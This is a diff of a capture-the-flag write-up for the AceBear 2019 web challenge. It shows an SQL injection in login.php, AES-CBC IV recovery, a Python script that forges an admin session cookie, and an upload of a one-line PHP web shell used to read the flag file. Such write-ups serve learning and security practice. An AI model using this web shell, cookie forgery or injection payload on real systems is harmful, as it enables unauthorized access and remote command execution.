@@ -4,14 +4,17 @@
 Given a website http://54.169.92.223/
 And a hint : backup.bak?
 ```
+![website](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/website.png)
+> The hint is backup.bak
 > Which Means there is a backup file , http://54.169.92.223/backup.bak
-> Dowloaded the [backup.bak]() and rename to backup.tgz & Extract it
-> There we get the soure code
-### On Inscepting the Source code
+> Dowloaded the backup.bak and rename to backup.tgz & Extract it
+> There we get the source code
+
+### On Inscepting the [soure code](https://github.com/D1r3Wolf/CTF-writeups/tree/master/Acebear-2019/duudududduduud/backup)
 > We need to be a admin in order to upload files
 > No one can became an admin
 * But There is bug to expliot to became a admin
-> An SQL injection in login.php & This is the only SQL injection in the site
+> An SQL injection in [login.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/backup/login.php) & This is the only SQL injection in the site
 ![sql](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/login-php.png)
 ```php
 $username = check_cookie($_COOKIE["session_remember"],$key);
@@ -49,7 +52,7 @@ Here is the Bug , The key is used for IV ;
 In aes There is no way to get the Key from Encryption or Decryption
 But There is chance to get the IV in AES Decryption
 ```
-![aes]()
+![aes](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/aes_cbc.png)
 ```
 Let's Take 2 Block's AES encryption
 
@@ -71,7 +74,7 @@ iv = pt1 ^ Dec(blk)
 
 -----------    iv = pt1 ^ pt2 ^ blk  ----------------------
 ```
-* How we get the plain text ; 
+> How we get the plain text ; 
 ```php
 $username = check_cookie($_COOKIE["session_remember"],$key);
 $tmp = $username;
@@ -95,9 +98,9 @@ else
 {
 	die("Error : ".base64_encode($tmp)." is not a valid cookie or is expired!");
 }
-// Here the $tmp is plaintext
+// Here the $tmp is plaintext ; It returns a Error Msg with plaintext
 ```
-### Extracting the IV [key.py]()
+### Extracting the IV [key.py](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/key.py)
 ```py 
 from requests import session
 from base64 import b64encode,b64decode
@@ -154,9 +157,29 @@ payload = "' UNION SELECT 'D1r3Wolf',1;#"
 payload += "|thisisareallyreallylongstringasfalsfassfasfaasff"
 payload = pad(payload) # Because AES encrytion , decrytion goes in Blocks
 ```
-### Making a cookie
+### Making a cookie: [cookie.py](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/cookie.py)
 ```py
+from requests import session
+from base64 import b64encode,b64decode
+from Crypto.Cipher import AES
+from key import Extract_iv
 
+def Encrypt(S):
+	A = AES.new(key,AES.MODE_CBC,key)
+	Ct = A.encrypt(S)
+	return b64encode(Ct)
+
+key = Extract_iv()
+
+def pad(S):
+	return S + '\x00'*( 16-(len(S)%16) )
+payload = "' UNION SELECT 'D1r3Wolf',1;#"
+payload += "|thisisareallyreallylongstringasfalsfassfasfaasff"
+payload = pad(payload)
+
+cookie = Encrypt(payload)
+
+print "[+] cookie :",cookie
 ```
 * output
 ```
@@ -170,10 +193,10 @@ session_remember : 1FpxWQyccSU6z6xePwv990SfdilJUgIUpg0RHTss5Zcq92uLD6Va4KjpdHpBz
 
 ```
 ### here we go
-![admin]()
+![admin](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/admin.png)
 > There is a upload option for admin
-[upload]()
-> Now on checking the upload.php
+[upload](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload.png)
+> Now on checking the [upload.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/backup/upload.php)
 ```php
 $json = json_decode(file_get_contents($_SESSION["folder"]."/manifest.json"),true);
 if ($json["type"] !== "h4x0r" || !isset($json["name"]))
@@ -191,29 +214,29 @@ we can create upload any files
 But in those files there mush be a file 'manifest.json'
 A json file with "type":"h4x0r","name":"anything" 
 ```
-> manifest.json
+> [manifest.json](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/manifest.json)
 ```json
 {"type":"h4x0r","name":"D1r3Wolf"}
 ```
-> cmp.php
+> [cmp.php](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/cmd.php)
 ```php
 <?php 
 if(isset($_GET['cmd'])){ echo "<pre>"; $cmd = ($_GET['cmd']); system($cmd); echo "</pre>"; die; }
 ?>
 ```
-> zip those two files [evil.zip] && upload it to server
-![upload1]()
+> zip those two files [evil.zip](https://github.com/D1r3Wolf/CTF-writeups/blob/master/Acebear-2019/duudududduduud/evil.zip) && upload it to server
+![upload1](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload1.png)
 > It Provides a path uploads/a3d7ebbe913126890938bdfe90833490/
 > Access them on http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/
-![upload2]()
+![upload2](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/upload2.png)
 > Now there is our cmd.php ; use it to RCE
-![cmd]()
+![cmd](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/cmd.png)
 > OUR backdoor is working ;
 > By the Given source code we can know that flag is at `lib/connection.php` 
 > path is `../../lib/connection.php`
 > exploit is `view-source:http://54.169.92.223/uploads/a3d7ebbe913126890938bdfe90833490/cmd.php?cmd=cat%20../../lib/connection.php`
 > view source is important as the browser try's to parses it ,Didn't display the php file properly
-![flag]()
+![flag](https://raw.githubusercontent.com/D1r3Wolf/CTF-writeups/master/Acebear-2019/duudududduduud/img/flag.png)
 
 ```
 It is pretty interesting and
